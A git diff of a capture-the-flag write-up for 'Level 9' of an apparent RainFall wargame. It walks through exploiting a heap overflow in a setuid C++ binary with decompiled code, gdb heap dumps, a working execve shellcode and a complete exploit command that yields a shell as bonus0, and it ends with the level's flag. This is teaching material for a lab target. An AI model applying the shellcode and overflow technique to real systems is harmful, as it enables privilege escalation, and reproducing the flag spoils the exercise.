@@ -1,24 +1,189 @@
+# Level 9
 
-0x804a008:	0x08048848	0x0804a018	0x90909090	0x90909090 <- 0x0804a00c point to nop slide
-0x804a018:	0x90909090	0x90909090	0x90909090	0x90909090
-0x804a028:	0x90909090	0x90909090	0x90909090	0x90909090
-0x804a038:	0x90909090	0x90909090	0x90909090	0x90909090
-0x804a048:	0x90909090	0x90909090	0x90909090	0x90909090
-0x804a058:	0x90909090	0x6850c031	0x68732f2f	0x69622f68
-0x804a068:	0x89e3896e	0xb0c289c1	0x3180cd0b	0x80cd40c0
-0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000 <- point to first object (indirect shellcode)
+## General Informations 
 
-second obj -> first obj -> shellcode
+**Path** : `/home/user/level9/level9` </br>
+**File** : 
+```
+level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9`
+
+## Static Analysis
+
+After decompiling the binary and understandint it, we get the pseudo code below: 
+
+```
+void __thiscall N::setAnnotation(N *this,char *param_1)
+{
+  size_t __n;
+  
+  __n = strlen(param_1);
+  memcpy(this + 4,param_1,__n);
+  return;
+}
+
+void main(int param_1,int param_2)
+{
+  N *this;
+  N *this_00;
+  
+  if (param_1 < 2) {
+                    /* WARNING: Subroutine does not return */
+    _exit(1);
+  }
+  this = (N *)operator.new(0x6c);
+  N::N(this,5);
+  this_00 = (N *)operator.new(0x6c);
+  N::N(this_00,6);
+  N::setAnnotation(this,*(char **)(param_2 + 4));
+  (*(code *)**(undefined4 **)this_00)(this_00,this);
+  return;
+}
+```
+
+- `main`, which:
+	- Allocates spaces for 2 objects `N` of size `0x6c - 108` and sets their values to 5 and 6.
+	- Then `setAnnotation` is called on the first object with the first argument.
+	- Finally, the second object address is cast to a double pointer, dereferenced into a function pointer, and is called.
+- `N::setAnnotation` performs a memcpy into the destination `this + 4` — the next address after the object — and copies the user input in totality. This looks interesting because the 2 objects are adjacent in memory, and the memcpy is called on the first object. We may be able to overflow into the second object and overwrite its address to point anywhere else.
 
 
-=> 2 contiguous object are created 
-=> strcpy function allow us to overwrite the data of these objects in the heap
-=> We can overwrite the address of these object and the data inside 
-=> We overwrite the address of the first object to a nop slide followed by a shell code 
-=> And we overwrite the address of the second object to the address of the first object 
-=> Wich point to the nop slide and shellcode
+## Vulnerability found 
+
+This time, the vulnerability lies in the code implementation. The `memcpy` function doesn't limit the number of characters copied, meaning we can write beyond the bounds of the first object.
+
+## Dynamic Analysis
+
+We put a breakpoint just after `setAnnotation`:
+```
+(gdb) b *0x0804867c
+```
+
+Then we run the program with a basic argument `AAAA` and display the heap:
+```
+(gdb) r "AAAA"
+(gdb) info proc mappings
+...
+	 0x804a000  0x806b000    0x21000        0x0 [heap]
+...
+(gdb) x/32x 0x804a000
+0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141 <- "AAAA" - our input
+0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000 <- start of the second address 
+```
+
+The first object starts at address `0x804a008`, followed by our input `AAAA`. </br>
+Past the size of the first object (108 bytes), we find the second object's address: `0x804a078`. </br>
+Let's overwriting this address:
+```
+(gdb) r `python -c 'print "A"*112'`
+(gdb) c
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+```
+
+The program segfaults and that's because the address of the second object is cast to a **double pointer**, dereferenced twice, then cast to a function pointer. `(*(code *)**(undefined4 **)this_00)` </br>
+So to make it work, we need to ensure this address chain points to valid memory:
+```
+(gdb) r `python -c 'print "A"*108 + "\x0c\xa0\x04\x08"'`
+(gdb) c
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+```
+
+It works ! The address of the second object is overwritten with an address inside the first object, filled with `A`s. </br>
+The next step is to redirect this address to another one containing the instructions to launch a shell.
+Since we don't have a function in the ELF that launches a shell, we’ll use a custom `shellcode`. </br>
+The instruction flow will look like this:
+
+```
+-> (*(code *)**(undefined4 **)this_00)
+
++-------------------+
+|     this_00		| --> Address of the first object, pointing to an address in the stack
++-------------------+
+		|
+        v
++-------------------+
+|  	  a1_stack 		| --> An address in the stack, pointing to another address (because of the 2 dereferences)
++-------------------+
+		|
+        v
++-------------------+
+|  	  a2_stack 		| --> Another address in the stack, pointing to the shellcode instructions
++-------------------+
+		|
+        v
++-------------------+
+|  Shellcode (ASM)  | --> Shellcode assembly instructions, stored in the input buffer
++-------------------+
+```
+
+We will make the 2 addresses point to addesses in the heap and finally point to `SIGTRAP - 0xCC` instructions:
+```
+(gdb) r `python -c 'print "\x10\xa0\x04\x08" + "\xCC"*104 +"\x0c\xa0\x04\x08"'`
+(gdb) x/32x 0x804a000
+0x804a000:	0x00000000	0x00000071	0x08048848	0x0804a010
+0x804a010:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
+0x804a020:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
+0x804a030:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
+0x804a040:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
+0x804a050:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
+0x804a060:	0xcccccccc	0xcccccccc	0xcccccccc	0xcccccccc
+0x804a070:	0xcccccccc	0xcccccccc	0x0804a00c	0x00000000
+(gdb) c
+Continuing.
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x0804a019 in ?? ()
+```
+
+The instructions are correctly executed and the `SIGTRAP` is raised. </br>
+To launch a shell, we will replace the first 28 bytes of the `0xCC` padding with shellcode instructions.`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`.
+```
+(gdb) r `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xCC"*(104-28) +"\x0c\xa0\x04\x08"'`
+...
+process 3835 is executing new program: /bin/dash
+$ 
+```
+
+And it works ! The shell is launched in gdb !
 
 
-./level9 `python -c 'print "\x18\xa0\x04\x08" + "\x90"*(104-28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" +"\x0c\xa0\x04\x08"'`
+## Payload construction 
+
+We overwrite the address of the first object to an address in the stack
+```
+`python -c 'print "A"*(108) +"\x0c\xa0\x04\x08"'`
+```
+
+Then make this first address point to a second address, wich points to assembly instructions (`0x0804a00c -> 0x0804a010 -> 0xCC`):
+
+```
+`python -c 'print "\x10\xa0\x04\x08" + "\xCC"*104 +"\x0c\xa0\x04\x08"'`
+```
+And finally we replace the first bytes by the `shellcode`:
+```
+`python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xCC"*(104-28) +"\x0c\xa0\x04\x08"'`
+```
 
 
+## Demonstration 
+
+```
+level9@RainFall:~$ ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xCC"*(104-28) +"\x0c\xa0\x04\x08"'`
+$ whoami
+bonus0
+```
+
+## Flag 
+
+```
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
